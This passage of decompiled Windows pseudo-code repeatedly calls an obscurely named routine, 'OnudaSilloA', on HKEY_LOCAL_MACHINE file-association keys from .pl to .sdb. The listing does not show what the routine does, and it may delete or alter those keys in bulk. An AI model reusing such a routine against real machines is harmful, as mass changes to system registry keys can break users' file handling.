  loc_00452B94: var_A9C0 = OnudaSilloA(global_80000002, var_A9BC)
  loc_00452B99: call var_A9C4 = global_00401054
  loc_00452BA2: call var_A9C8 = global_004011CC
  loc_00452BB8: call var_A9CC = global_00401188(var_24, "SOFTWARE\Classes\.pl\PersistentHandler")
  loc_00452BC4: var_A9D0 = OnudaSilloA(global_80000002, var_A9CC)
  loc_00452BC9: call var_A9D4 = global_00401054
  loc_00452BD2: call var_A9D8 = global_004011CC
  loc_00452BE8: call var_A9DC = global_00401188(var_24, "SOFTWARE\Classes\.pl")
  loc_00452BF4: var_A9E0 = OnudaSilloA(global_80000002, var_A9DC)
  loc_00452BF9: call var_A9E4 = global_00401054
  loc_00452C02: call var_A9E8 = global_004011CC
  loc_00452C18: call var_A9EC = global_00401188(var_24, "SOFTWARE\Classes\.plg")
  loc_00452C24: var_A9F0 = OnudaSilloA(global_80000002, var_A9EC)
  loc_00452C29: call var_A9F4 = global_00401054
  loc_00452C32: call var_A9F8 = global_004011CC
  loc_00452C48: call var_A9FC = global_00401188(var_24, "SOFTWARE\Classes\.pma\PersistentHandler")
  loc_00452C54: var_AA00 = OnudaSilloA(global_80000002, var_A9FC)
  loc_00452C59: call var_AA04 = global_00401054
  loc_00452C62: call var_AA08 = global_004011CC
  loc_00452C78: call var_AA0C = global_00401188(var_24, "SOFTWARE\Classes\.pma")
  loc_00452C84: var_AA10 = OnudaSilloA(global_80000002, var_AA0C)
  loc_00452C89: call var_AA14 = global_00401054
  loc_00452C92: call var_AA18 = global_004011CC
  loc_00452CA8: call var_AA1C = global_00401188(var_24, "SOFTWARE\Classes\.pmc\PersistentHandler")
  loc_00452CB4: var_AA20 = OnudaSilloA(global_80000002, var_AA1C)
  loc_00452CB9: call var_AA24 = global_00401054
  loc_00452CC2: call var_AA28 = global_004011CC
  loc_00452CD8: call var_AA2C = global_00401188(var_24, "SOFTWARE\Classes\.pmc")
  loc_00452CE4: var_AA30 = OnudaSilloA(global_80000002, var_AA2C)
  loc_00452CE9: call var_AA34 = global_00401054
  loc_00452CF2: call var_AA38 = global_004011CC
  loc_00452D08: call var_AA3C = global_00401188(var_24, "SOFTWARE\Classes\.pml\PersistentHandler")
  loc_00452D14: var_AA40 = OnudaSilloA(global_80000002, var_AA3C)
  loc_00452D19: call var_AA44 = global_00401054
  loc_00452D22: call var_AA48 = global_004011CC
  loc_00452D38: call var_AA4C = global_00401188(var_24, "SOFTWARE\Classes\.pml")
  loc_00452D44: var_AA50 = OnudaSilloA(global_80000002, var_AA4C)
  loc_00452D49: call var_AA54 = global_00401054
  loc_00452D52: call var_AA58 = global_004011CC
  loc_00452D68: call var_AA5C = global_00401188(var_24, "SOFTWARE\Classes\.pmr\PersistentHandler")
  loc_00452D74: var_AA60 = OnudaSilloA(global_80000002, var_AA5C)
  loc_00452D79: call var_AA64 = global_00401054
  loc_00452D82: call var_AA68 = global_004011CC
  loc_00452D98: call var_AA6C = global_00401188(var_24, "SOFTWARE\Classes\.pmr")
  loc_00452DA4: var_AA70 = OnudaSilloA(global_80000002, var_AA6C)
  loc_00452DA9: call var_AA74 = global_00401054
  loc_00452DB2: call var_AA78 = global_004011CC
  loc_00452DC8: call var_AA7C = global_00401188(var_24, "SOFTWARE\Classes\.pmw")
  loc_00452DD4: var_AA80 = OnudaSilloA(global_80000002, var_AA7C)
  loc_00452DD9: call var_AA84 = global_00401054
  loc_00452DE2: call var_AA88 = global_004011CC
  loc_00452DF8: call var_AA8C = global_00401188(var_24, "SOFTWARE\Classes\.pnf")
  loc_00452E04: var_AA90 = OnudaSilloA(global_80000002, var_AA8C)
  loc_00452E09: call var_AA94 = global_00401054
  loc_00452E12: call var_AA98 = global_004011CC
  loc_00452E28: call var_AA9C = global_00401188(var_24, "SOFTWARE\Classes\.png\OpenWithProgids")
  loc_00452E34: var_AAA0 = OnudaSilloA(global_80000002, var_AA9C)
  loc_00452E39: call var_AAA4 = global_00401054
  loc_00452E42: call var_AAA8 = global_004011CC
  loc_00452E58: call var_AAAC = global_00401188(var_24, "SOFTWARE\Classes\.png\PersistentHandler")
  loc_00452E64: var_AAB0 = OnudaSilloA(global_80000002, var_AAAC)
  loc_00452E69: call var_AAB4 = global_00401054
  loc_00452E72: call var_AAB8 = global_004011CC
  loc_00452E88: call var_AABC = global_00401188(var_24, "SOFTWARE\Classes\.png")
  loc_00452E94: var_AAC0 = OnudaSilloA(global_80000002, var_AABC)
  loc_00452E99: call var_AAC4 = global_00401054
  loc_00452EA2: call var_AAC8 = global_004011CC
  loc_00452EB8: call var_AACC = global_00401188(var_24, "SOFTWARE\Classes\.pot\PersistentHandler")
  loc_00452EC4: var_AAD0 = OnudaSilloA(global_80000002, var_AACC)
  loc_00452EC9: call var_AAD4 = global_00401054
  loc_00452ED2: call var_AAD8 = global_004011CC
  loc_00452EE8: call var_AADC = global_00401188(var_24, "SOFTWARE\Classes\.pot")
  loc_00452EF4: var_AAE0 = OnudaSilloA(global_80000002, var_AADC)
  loc_00452EF9: call var_AAE4 = global_00401054
  loc_00452F02: call var_AAE8 = global_004011CC
  loc_00452F18: call var_AAEC = global_00401188(var_24, "SOFTWARE\Classes\.pps\PersistentHandler")
  loc_00452F24: var_AAF0 = OnudaSilloA(global_80000002, var_AAEC)
  loc_00452F29: call var_AAF4 = global_00401054
  loc_00452F32: call var_AAF8 = global_004011CC
  loc_00452F48: call var_AAFC = global_00401188(var_24, "SOFTWARE\Classes\.pps")
  loc_00452F54: var_AB00 = OnudaSilloA(global_80000002, var_AAFC)
  loc_00452F59: call var_AB04 = global_00401054
  loc_00452F62: call var_AB08 = global_004011CC
  loc_00452F78: call var_AB0C = global_00401188(var_24, "SOFTWARE\Classes\.ppt\PowerPoint.Show.4\ShellNew")
  loc_00452F84: var_AB10 = OnudaSilloA(global_80000002, var_AB0C)
  loc_00452F89: call var_AB14 = global_00401054
  loc_00452F92: call var_AB18 = global_004011CC
  loc_00452FA8: call var_AB1C = global_00401188(var_24, "SOFTWARE\Classes\.ppt\PowerPoint.Show.4")
  loc_00452FB4: var_AB20 = OnudaSilloA(global_80000002, var_AB1C)
  loc_00452FB9: call var_AB24 = global_00401054
  loc_00452FC2: call var_AB28 = global_004011CC
  loc_00452FD8: call var_AB2C = global_00401188(var_24, "SOFTWARE\Classes\.ppt\PersistentHandler")
  loc_00452FE4: var_AB30 = OnudaSilloA(global_80000002, var_AB2C)
  loc_00452FE9: call var_AB34 = global_00401054
  loc_00452FF2: call var_AB38 = global_004011CC
  loc_00453008: call var_AB3C = global_00401188(var_24, "SOFTWARE\Classes\.ppt")
  loc_00453014: var_AB40 = OnudaSilloA(global_80000002, var_AB3C)
  loc_00453019: call var_AB44 = global_00401054
  loc_00453022: call var_AB48 = global_004011CC
  loc_00453038: call var_AB4C = global_00401188(var_24, "SOFTWARE\Classes\.prf")
  loc_00453044: var_AB50 = OnudaSilloA(global_80000002, var_AB4C)
  loc_00453049: call var_AB54 = global_00401054
  loc_00453052: call var_AB58 = global_004011CC
  loc_00453068: call var_AB5C = global_00401188(var_24, "SOFTWARE\Classes\.ps")
  loc_00453074: var_AB60 = OnudaSilloA(global_80000002, var_AB5C)
  loc_00453079: call var_AB64 = global_00401054
  loc_00453082: call var_AB68 = global_004011CC
  loc_00453098: call var_AB6C = global_00401188(var_24, "SOFTWARE\Classes\.psd\PersistentHandler")
  loc_004530A4: var_AB70 = OnudaSilloA(global_80000002, var_AB6C)
  loc_004530A9: call var_AB74 = global_00401054
  loc_004530B2: call var_AB78 = global_004011CC
  loc_004530C8: call var_AB7C = global_00401188(var_24, "SOFTWARE\Classes\.psd")
  loc_004530D4: var_AB80 = OnudaSilloA(global_80000002, var_AB7C)
  loc_004530D9: call var_AB84 = global_00401054
  loc_004530E2: call var_AB88 = global_004011CC
  loc_004530F8: call var_AB8C = global_00401188(var_24, "SOFTWARE\Classes\.psw")
  loc_00453104: var_AB90 = OnudaSilloA(global_80000002, var_AB8C)
  loc_00453109: call var_AB94 = global_00401054
  loc_00453112: call var_AB98 = global_004011CC
  loc_00453128: call var_AB9C = global_00401188(var_24, "SOFTWARE\Classes\.qds")
  loc_00453134: var_ABA0 = OnudaSilloA(global_80000002, var_AB9C)
  loc_00453139: call var_ABA4 = global_00401054
  loc_00453142: call var_ABA8 = global_004011CC
  loc_00453158: call var_ABAC = global_00401188(var_24, "SOFTWARE\Classes\.qt")
  loc_00453164: var_ABB0 = OnudaSilloA(global_80000002, var_ABAC)
  loc_00453169: call var_ABB4 = global_00401054
  loc_00453172: call var_ABB8 = global_004011CC
  loc_00453188: call var_ABBC = global_00401188(var_24, "SOFTWARE\Classes\.qtl\Shell\Open\Command")
  loc_00453194: var_ABC0 = OnudaSilloA(global_80000002, var_ABBC)
  loc_00453199: call var_ABC4 = global_00401054
  loc_004531A2: call var_ABC8 = global_004011CC
  loc_004531B8: call var_ABCC = global_00401188(var_24, "SOFTWARE\Classes\.qtl\Shell\Open")
  loc_004531C4: var_ABD0 = OnudaSilloA(global_80000002, var_ABCC)
  loc_004531C9: call var_ABD4 = global_00401054
  loc_004531D2: call var_ABD8 = global_004011CC
  loc_004531E8: call var_ABDC = global_00401188(var_24, "SOFTWARE\Classes\.qtl\Shell")
  loc_004531F4: var_ABE0 = OnudaSilloA(global_80000002, var_ABDC)
  loc_004531F9: call var_ABE4 = global_00401054
  loc_00453202: call var_ABE8 = global_004011CC
  loc_00453218: call var_ABEC = global_00401188(var_24, "SOFTWARE\Classes\.qtl\DefaultIcon")
  loc_00453224: var_ABF0 = OnudaSilloA(global_80000002, var_ABEC)
  loc_00453229: call var_ABF4 = global_00401054
  loc_00453232: call var_ABF8 = global_004011CC
  loc_00453248: call var_ABFC = global_00401188(var_24, "SOFTWARE\Classes\.qtl")
  loc_00453254: var_AC00 = OnudaSilloA(global_80000002, var_ABFC)
  loc_00453259: call var_AC04 = global_00401054
  loc_00453262: call var_AC08 = global_004011CC
  loc_00453278: call var_AC0C = global_00401188(var_24, "SOFTWARE\Classes\.r00")
  loc_00453284: var_AC10 = OnudaSilloA(global_80000002, var_AC0C)
  loc_00453289: call var_AC14 = global_00401054
  loc_00453292: call var_AC18 = global_004011CC
  loc_004532A8: call var_AC1C = global_00401188(var_24, "SOFTWARE\Classes\.r01")
  loc_004532B4: var_AC20 = OnudaSilloA(global_80000002, var_AC1C)
  loc_004532B9: call var_AC24 = global_00401054
  loc_004532C2: call var_AC28 = global_004011CC
  loc_004532D8: call var_AC2C = global_00401188(var_24, "SOFTWARE\Classes\.r02")
  loc_004532E4: var_AC30 = OnudaSilloA(global_80000002, var_AC2C)
  loc_004532E9: call var_AC34 = global_00401054
  loc_004532F2: call var_AC38 = global_004011CC
  loc_00453308: call var_AC3C = global_00401188(var_24, "SOFTWARE\Classes\.r03")
  loc_00453314: var_AC40 = OnudaSilloA(global_80000002, var_AC3C)
  loc_00453319: call var_AC44 = global_00401054
  loc_00453322: call var_AC48 = global_004011CC
  loc_00453338: call var_AC4C = global_00401188(var_24, "SOFTWARE\Classes\.r04")
  loc_00453344: var_AC50 = OnudaSilloA(global_80000002, var_AC4C)
  loc_00453349: call var_AC54 = global_00401054
  loc_00453352: call var_AC58 = global_004011CC
  loc_00453368: call var_AC5C = global_00401188(var_24, "SOFTWARE\Classes\.r05")
  loc_00453374: var_AC60 = OnudaSilloA(global_80000002, var_AC5C)
  loc_00453379: call var_AC64 = global_00401054
  loc_00453382: call var_AC68 = global_004011CC
  loc_00453398: call var_AC6C = global_00401188(var_24, "SOFTWARE\Classes\.r06")
  loc_004533A4: var_AC70 = OnudaSilloA(global_80000002, var_AC6C)
  loc_004533A9: call var_AC74 = global_00401054
  loc_004533B2: call var_AC78 = global_004011CC
  loc_004533C8: call var_AC7C = global_00401188(var_24, "SOFTWARE\Classes\.r07")
  loc_004533D4: var_AC80 = OnudaSilloA(global_80000002, var_AC7C)
  loc_004533D9: call var_AC84 = global_00401054
  loc_004533E2: call var_AC88 = global_004011CC
  loc_004533F8: call var_AC8C = global_00401188(var_24, "SOFTWARE\Classes\.r08")
  loc_00453404: var_AC90 = OnudaSilloA(global_80000002, var_AC8C)
  loc_00453409: call var_AC94 = global_00401054
  loc_00453412: call var_AC98 = global_004011CC
  loc_00453428: call var_AC9C = global_00401188(var_24, "SOFTWARE\Classes\.r09")
  loc_00453434: var_ACA0 = OnudaSilloA(global_80000002, var_AC9C)
  loc_00453439: call var_ACA4 = global_00401054
  loc_00453442: call var_ACA8 = global_004011CC
  loc_00453458: call var_ACAC = global_00401188(var_24, "SOFTWARE\Classes\.r10")
  loc_00453464: var_ACB0 = OnudaSilloA(global_80000002, var_ACAC)
  loc_00453469: call var_ACB4 = global_00401054
  loc_00453472: call var_ACB8 = global_004011CC
  loc_00453488: call var_ACBC = global_00401188(var_24, "SOFTWARE\Classes\.r11")
  loc_00453494: var_ACC0 = OnudaSilloA(global_80000002, var_ACBC)
  loc_00453499: call var_ACC4 = global_00401054
  loc_004534A2: call var_ACC8 = global_004011CC
  loc_004534B8: call var_ACCC = global_00401188(var_24, "SOFTWARE\Classes\.r12")
  loc_004534C4: var_ACD0 = OnudaSilloA(global_80000002, var_ACCC)
  loc_004534C9: call var_ACD4 = global_00401054
  loc_004534D2: call var_ACD8 = global_004011CC
  loc_004534E8: call var_ACDC = global_00401188(var_24, "SOFTWARE\Classes\.r13")
  loc_004534F4: var_ACE0 = OnudaSilloA(global_80000002, var_ACDC)
  loc_004534F9: call var_ACE4 = global_00401054
  loc_00453502: call var_ACE8 = global_004011CC
  loc_00453518: call var_ACEC = global_00401188(var_24, "SOFTWARE\Classes\.r14")
  loc_00453524: var_ACF0 = OnudaSilloA(global_80000002, var_ACEC)
  loc_00453529: call var_ACF4 = global_00401054
  loc_00453532: call var_ACF8 = global_004011CC
  loc_00453548: call var_ACFC = global_00401188(var_24, "SOFTWARE\Classes\.r15")
  loc_00453554: var_AD00 = OnudaSilloA(global_80000002, var_ACFC)
  loc_00453559: call var_AD04 = global_00401054
  loc_00453562: call var_AD08 = global_004011CC
  loc_00453578: call var_AD0C = global_00401188(var_24, "SOFTWARE\Classes\.r16")
  loc_00453584: var_AD10 = OnudaSilloA(global_80000002, var_AD0C)
  loc_00453589: call var_AD14 = global_00401054
  loc_00453592: call var_AD18 = global_004011CC
  loc_004535A8: call var_AD1C = global_00401188(var_24, "SOFTWARE\Classes\.r17")
  loc_004535B4: var_AD20 = OnudaSilloA(global_80000002, var_AD1C)
  loc_004535B9: call var_AD24 = global_00401054
  loc_004535C2: call var_AD28 = global_004011CC
  loc_004535D8: call var_AD2C = global_00401188(var_24, "SOFTWARE\Classes\.r18")
  loc_004535E4: var_AD30 = OnudaSilloA(global_80000002, var_AD2C)
  loc_004535E9: call var_AD34 = global_00401054
  loc_004535F2: call var_AD38 = global_004011CC
  loc_00453608: call var_AD3C = global_00401188(var_24, "SOFTWARE\Classes\.r19")
  loc_00453614: var_AD40 = OnudaSilloA(global_80000002, var_AD3C)
  loc_00453619: call var_AD44 = global_00401054
  loc_00453622: call var_AD48 = global_004011CC
  loc_00453638: call var_AD4C = global_00401188(var_24, "SOFTWARE\Classes\.r20")
  loc_00453644: var_AD50 = OnudaSilloA(global_80000002, var_AD4C)
  loc_00453649: call var_AD54 = global_00401054
  loc_00453652: call var_AD58 = global_004011CC
  loc_00453668: call var_AD5C = global_00401188(var_24, "SOFTWARE\Classes\.r21")
  loc_00453674: var_AD60 = OnudaSilloA(global_80000002, var_AD5C)
  loc_00453679: call var_AD64 = global_00401054
  loc_00453682: call var_AD68 = global_004011CC
  loc_00453698: call var_AD6C = global_00401188(var_24, "SOFTWARE\Classes\.r22")
  loc_004536A4: var_AD70 = OnudaSilloA(global_80000002, var_AD6C)
  loc_004536A9: call var_AD74 = global_00401054
  loc_004536B2: call var_AD78 = global_004011CC
  loc_004536C8: call var_AD7C = global_00401188(var_24, "SOFTWARE\Classes\.r23")
  loc_004536D4: var_AD80 = OnudaSilloA(global_80000002, var_AD7C)
  loc_004536D9: call var_AD84 = global_00401054
  loc_004536E2: call var_AD88 = global_004011CC
  loc_004536F8: call var_AD8C = global_00401188(var_24, "SOFTWARE\Classes\.r24")
  loc_00453704: var_AD90 = OnudaSilloA(global_80000002, var_AD8C)
  loc_00453709: call var_AD94 = global_00401054
  loc_00453712: call var_AD98 = global_004011CC
  loc_00453728: call var_AD9C = global_00401188(var_24, "SOFTWARE\Classes\.r25")
  loc_00453734: var_ADA0 = OnudaSilloA(global_80000002, var_AD9C)
  loc_00453739: call var_ADA4 = global_00401054
  loc_00453742: call var_ADA8 = global_004011CC
  loc_00453758: call var_ADAC = global_00401188(var_24, "SOFTWARE\Classes\.r26")
  loc_00453764: var_ADB0 = OnudaSilloA(global_80000002, var_ADAC)
  loc_00453769: call var_ADB4 = global_00401054
  loc_00453772: call var_ADB8 = global_004011CC
  loc_00453788: call var_ADBC = global_00401188(var_24, "SOFTWARE\Classes\.r27")
  loc_00453794: var_ADC0 = OnudaSilloA(global_80000002, var_ADBC)
  loc_00453799: call var_ADC4 = global_00401054
  loc_004537A2: call var_ADC8 = global_004011CC
  loc_004537B8: call var_ADCC = global_00401188(var_24, "SOFTWARE\Classes\.r28")
  loc_004537C4: var_ADD0 = OnudaSilloA(global_80000002, var_ADCC)
  loc_004537C9: call var_ADD4 = global_00401054
  loc_004537D2: call var_ADD8 = global_004011CC
  loc_004537E8: call var_ADDC = global_00401188(var_24, "SOFTWARE\Classes\.r29")
  loc_004537F4: var_ADE0 = OnudaSilloA(global_80000002, var_ADDC)
  loc_004537F9: call var_ADE4 = global_00401054
  loc_00453802: call var_ADE8 = global_004011CC
  loc_00453818: call var_ADEC = global_00401188(var_24, "SOFTWARE\Classes\.ra")
  loc_00453824: var_ADF0 = OnudaSilloA(global_80000002, var_ADEC)
  loc_00453829: call var_ADF4 = global_00401054
  loc_00453832: call var_ADF8 = global_004011CC
  loc_00453848: call var_ADFC = global_00401188(var_24, "SOFTWARE\Classes\.ram")
  loc_00453854: var_AE00 = OnudaSilloA(global_80000002, var_ADFC)
  loc_00453859: call var_AE04 = global_00401054
  loc_00453862: call var_AE08 = global_004011CC
  loc_00453878: call var_AE0C = global_00401188(var_24, "SOFTWARE\Classes\.rar\ShellNew")
  loc_00453884: var_AE10 = OnudaSilloA(global_80000002, var_AE0C)
  loc_00453889: call var_AE14 = global_00401054
  loc_00453892: call var_AE18 = global_004011CC
  loc_004538A8: call var_AE1C = global_00401188(var_24, "SOFTWARE\Classes\.rar")
  loc_004538B4: var_AE20 = OnudaSilloA(global_80000002, var_AE1C)
  loc_004538B9: call var_AE24 = global_00401054
  loc_004538C2: call var_AE28 = global_004011CC
  loc_004538D8: call var_AE2C = global_00401188(var_24, "SOFTWARE\Classes\.rat")
  loc_004538E4: var_AE30 = OnudaSilloA(global_80000002, var_AE2C)
  loc_004538E9: call var_AE34 = global_00401054
  loc_004538F2: call var_AE38 = global_004011CC
  loc_00453908: call var_AE3C = global_00401188(var_24, "SOFTWARE\Classes\.rc\PersistentHandler")
  loc_00453914: var_AE40 = OnudaSilloA(global_80000002, var_AE3C)
  loc_00453919: call var_AE44 = global_00401054
  loc_00453922: call var_AE48 = global_004011CC
  loc_00453938: call var_AE4C = global_00401188(var_24, "SOFTWARE\Classes\.rc")
  loc_00453944: var_AE50 = OnudaSilloA(global_80000002, var_AE4C)
  loc_00453949: call var_AE54 = global_00401054
  loc_00453952: call var_AE58 = global_004011CC
  loc_00453968: call var_AE5C = global_00401188(var_24, "SOFTWARE\Classes\.RDP")
  loc_00453974: var_AE60 = OnudaSilloA(global_80000002, var_AE5C)
  loc_00453979: call var_AE64 = global_00401054
  loc_00453982: call var_AE68 = global_004011CC
  loc_00453998: call var_AE6C = global_00401188(var_24, "SOFTWARE\Classes\.reg\PersistentHandler")
  loc_004539A4: var_AE70 = OnudaSilloA(global_80000002, var_AE6C)
  loc_004539A9: call var_AE74 = global_00401054
  loc_004539B2: call var_AE78 = global_004011CC
  loc_004539C8: call var_AE7C = global_00401188(var_24, "SOFTWARE\Classes\.reg")
  loc_004539D4: var_AE80 = OnudaSilloA(global_80000002, var_AE7C)
  loc_004539D9: call var_AE84 = global_00401054
  loc_004539E2: call var_AE88 = global_004011CC
  loc_004539F8: call var_AE8C = global_00401188(var_24, "SOFTWARE\Classes\.res\PersistentHandler")
  loc_00453A04: var_AE90 = OnudaSilloA(global_80000002, var_AE8C)
  loc_00453A09: call var_AE94 = global_00401054
  loc_00453A12: call var_AE98 = global_004011CC
  loc_00453A28: call var_AE9C = global_00401188(var_24, "SOFTWARE\Classes\.res")
  loc_00453A34: var_AEA0 = OnudaSilloA(global_80000002, var_AE9C)
  loc_00453A39: call var_AEA4 = global_00401054
  loc_00453A42: call var_AEA8 = global_004011CC
  loc_00453A58: call var_AEAC = global_00401188(var_24, "SOFTWARE\Classes\.rev")
  loc_00453A64: var_AEB0 = OnudaSilloA(global_80000002, var_AEAC)
  loc_00453A69: call var_AEB4 = global_00401054
  loc_00453A72: call var_AEB8 = global_004011CC
  loc_00453A88: call var_AEBC = global_00401188(var_24, "SOFTWARE\Classes\.rle\PersistentHandler")
  loc_00453A94: var_AEC0 = OnudaSilloA(global_80000002, var_AEBC)
  loc_00453A99: call var_AEC4 = global_00401054
  loc_00453AA2: call var_AEC8 = global_004011CC
  loc_00453AB8: call var_AECC = global_00401188(var_24, "SOFTWARE\Classes\.rle")
  loc_00453AC4: var_AED0 = OnudaSilloA(global_80000002, var_AECC)
  loc_00453AC9: call var_AED4 = global_00401054
  loc_00453AD2: call var_AED8 = global_004011CC
  loc_00453AE8: call var_AEDC = global_00401188(var_24, "SOFTWARE\Classes\.rm")
  loc_00453AF4: var_AEE0 = OnudaSilloA(global_80000002, var_AEDC)
  loc_00453AF9: call var_AEE4 = global_00401054
  loc_00453B02: call var_AEE8 = global_004011CC
  loc_00453B18: call var_AEEC = global_00401188(var_24, "SOFTWARE\Classes\.rmi\PersistentHandler")
  loc_00453B24: var_AEF0 = OnudaSilloA(global_80000002, var_AEEC)
  loc_00453B29: call var_AEF4 = global_00401054
  loc_00453B32: call var_AEF8 = global_004011CC
  loc_00453B48: call var_AEFC = global_00401188(var_24, "SOFTWARE\Classes\.rmi\OpenWithProgIds")
  loc_00453B54: var_AF00 = OnudaSilloA(global_80000002, var_AEFC)
  loc_00453B59: call var_AF04 = global_00401054
  loc_00453B62: call var_AF08 = global_004011CC
  loc_00453B78: call var_AF0C = global_00401188(var_24, "SOFTWARE\Classes\.rmi\OpenWithList\wmplayer.exe")
  loc_00453B84: var_AF10 = OnudaSilloA(global_80000002, var_AF0C)
  loc_00453B89: call var_AF14 = global_00401054
  loc_00453B92: call var_AF18 = global_004011CC
  loc_00453BA8: call var_AF1C = global_00401188(var_24, "SOFTWARE\Classes\.rmi\OpenWithList")
  loc_00453BB4: var_AF20 = OnudaSilloA(global_80000002, var_AF1C)
  loc_00453BB9: call var_AF24 = global_00401054
  loc_00453BC2: call var_AF28 = global_004011CC
  loc_00453BD8: call var_AF2C = global_00401188(var_24, "SOFTWARE\Classes\.rmi")
  loc_00453BE4: var_AF30 = OnudaSilloA(global_80000002, var_AF2C)
  loc_00453BE9: call var_AF34 = global_00401054
  loc_00453BF2: call var_AF38 = global_004011CC
  loc_00453C08: call var_AF3C = global_00401188(var_24, "SOFTWARE\Classes\.rmvb")
  loc_00453C14: var_AF40 = OnudaSilloA(global_80000002, var_AF3C)
  loc_00453C19: call var_AF44 = global_00401054
  loc_00453C22: call var_AF48 = global_004011CC
  loc_00453C38: call var_AF4C = global_00401188(var_24, "SOFTWARE\Classes\.rnk")
  loc_00453C44: var_AF50 = OnudaSilloA(global_80000002, var_AF4C)
  loc_00453C49: call var_AF54 = global_00401054
  loc_00453C52: call var_AF58 = global_004011CC
  loc_00453C68: call var_AF5C = global_00401188(var_24, "SOFTWARE\Classes\.rpc\PersistentHandler")
  loc_00453C74: var_AF60 = OnudaSilloA(global_80000002, var_AF5C)
  loc_00453C79: call var_AF64 = global_00401054
  loc_00453C82: call var_AF68 = global_004011CC
  loc_00453C98: call var_AF6C = global_00401188(var_24, "SOFTWARE\Classes\.rpc")
  loc_00453CA4: var_AF70 = OnudaSilloA(global_80000002, var_AF6C)
  loc_00453CA9: call var_AF74 = global_00401054
  loc_00453CB2: call var_AF78 = global_004011CC
  loc_00453CC8: call var_AF7C = global_00401188(var_24, "SOFTWARE\Classes\.rpm")
  loc_00453CD4: var_AF80 = OnudaSilloA(global_80000002, var_AF7C)
  loc_00453CD9: call var_AF84 = global_00401054
  loc_00453CE2: call var_AF88 = global_004011CC
  loc_00453CF8: call var_AF8C = global_00401188(var_24, "SOFTWARE\Classes\.rsp\PersistentHandler")
  loc_00453D04: var_AF90 = OnudaSilloA(global_80000002, var_AF8C)
  loc_00453D09: call var_AF94 = global_00401054
  loc_00453D12: call var_AF98 = global_004011CC
  loc_00453D28: call var_AF9C = global_00401188(var_24, "SOFTWARE\Classes\.rsp")
  loc_00453D34: var_AFA0 = OnudaSilloA(global_80000002, var_AF9C)
  loc_00453D39: call var_AFA4 = global_00401054
  loc_00453D42: call var_AFA8 = global_004011CC
  loc_00453D58: call var_AFAC = global_00401188(var_24, "SOFTWARE\Classes\.rtf\ShellNew")
  loc_00453D64: var_AFB0 = OnudaSilloA(global_80000002, var_AFAC)
  loc_00453D69: call var_AFB4 = global_00401054
  loc_00453D72: call var_AFB8 = global_004011CC
  loc_00453D88: call var_AFBC = global_00401188(var_24, "SOFTWARE\Classes\.rtf\PersistentHandler")
  loc_00453D94: var_AFC0 = OnudaSilloA(global_80000002, var_AFBC)
  loc_00453D99: call var_AFC4 = global_00401054
  loc_00453DA2: call var_AFC8 = global_004011CC
  loc_00453DB8: call var_AFCC = global_00401188(var_24, "SOFTWARE\Classes\.rtf\OpenWithList\WordPad.exe")
  loc_00453DC4: var_AFD0 = OnudaSilloA(global_80000002, var_AFCC)
  loc_00453DC9: call var_AFD4 = global_00401054
  loc_00453DD2: call var_AFD8 = global_004011CC
  loc_00453DE8: call var_AFDC = global_00401188(var_24, "SOFTWARE\Classes\.rtf\OpenWithList")
  loc_00453DF4: var_AFE0 = OnudaSilloA(global_80000002, var_AFDC)
  loc_00453DF9: call var_AFE4 = global_00401054
  loc_00453E02: call var_AFE8 = global_004011CC
  loc_00453E18: call var_AFEC = global_00401188(var_24, "SOFTWARE\Classes\.rtf")
  loc_00453E24: var_AFF0 = OnudaSilloA(global_80000002, var_AFEC)
  loc_00453E29: call var_AFF4 = global_00401054
  loc_00453E32: call var_AFF8 = global_004011CC
  loc_00453E48: call var_AFFC = global_00401188(var_24, "SOFTWARE\Classes\.sam\AmiProDocument\ShellNew")
  loc_00453E54: var_B000 = OnudaSilloA(global_80000002, var_AFFC)
  loc_00453E59: call var_B004 = global_00401054
  loc_00453E62: call var_B008 = global_004011CC
  loc_00453E78: call var_B00C = global_00401188(var_24, "SOFTWARE\Classes\.sam\AmiProDocument")
  loc_00453E84: var_B010 = OnudaSilloA(global_80000002, var_B00C)
  loc_00453E89: call var_B014 = global_00401054
  loc_00453E92: call var_B018 = global_004011CC
  loc_00453EA8: call var_B01C = global_00401188(var_24, "SOFTWARE\Classes\.sam")
  loc_00453EB4: var_B020 = OnudaSilloA(global_80000002, var_B01C)
  loc_00453EB9: call var_B024 = global_00401054
  loc_00453EC2: call var_B028 = global_004011CC
  loc_00453ED8: call var_B02C = global_00401188(var_24, "SOFTWARE\Classes\.sbr\PersistentHandler")
  loc_00453EE4: var_B030 = OnudaSilloA(global_80000002, var_B02C)
  loc_00453EE9: call var_B034 = global_00401054
  loc_00453EF2: call var_B038 = global_004011CC
  loc_00453F08: call var_B03C = global_00401188(var_24, "SOFTWARE\Classes\.sbr")
  loc_00453F14: var_B040 = OnudaSilloA(global_80000002, var_B03C)
  loc_00453F19: call var_B044 = global_00401054
  loc_00453F22: call var_B048 = global_004011CC
  loc_00453F38: call var_B04C = global_00401188(var_24, "SOFTWARE\Classes\.sc2\PersistentHandler")
  loc_00453F44: var_B050 = OnudaSilloA(global_80000002, var_B04C)
  loc_00453F49: call var_B054 = global_00401054
  loc_00453F52: call var_B058 = global_004011CC
  loc_00453F68: call var_B05C = global_00401188(var_24, "SOFTWARE\Classes\.sc2")
  loc_00453F74: var_B060 = OnudaSilloA(global_80000002, var_B05C)
  loc_00453F79: call var_B064 = global_00401054
  loc_00453F82: call var_B068 = global_004011CC
  loc_00453F98: call var_B06C = global_00401188(var_24, "SOFTWARE\Classes\.scf")
  loc_00453FA4: var_B070 = OnudaSilloA(global_80000002, var_B06C)
  loc_00453FA9: call var_B074 = global_00401054
  loc_00453FB2: call var_B078 = global_004011CC
  loc_00453FC8: call var_B07C = global_00401188(var_24, "SOFTWARE\Classes\.scp")
  loc_00453FD4: var_B080 = OnudaSilloA(global_80000002, var_B07C)
  loc_00453FD9: call var_B084 = global_00401054
  loc_00453FE2: call var_B088 = global_004011CC
  loc_00453FF8: call var_B08C = global_00401188(var_24, "SOFTWARE\Classes\.scr")
  loc_00454004: var_B090 = OnudaSilloA(global_80000002, var_B08C)
  loc_00454009: call var_B094 = global_00401054
  loc_00454012: call var_B098 = global_004011CC
  loc_00454028: call var_B09C = global_00401188(var_24, "SOFTWARE\Classes\.sct")
  loc_00454034: var_B0A0 = OnudaSilloA(global_80000002, var_B09C)
  loc_00454039: call var_B0A4 = global_00401054
  loc_00454042: call var_B0A8 = global_004011CC
  loc_00454058: call var_B0AC = global_00401188(var_24, "SOFTWARE\Classes\.sdb")
  loc_00454064: var_B0B0 = OnudaSilloA(global_80000002, var_B0AC)
  loc_00454069: call var_B0B4 = global_00401054
  loc_00454072: call var_B0B8 = global_004011CC
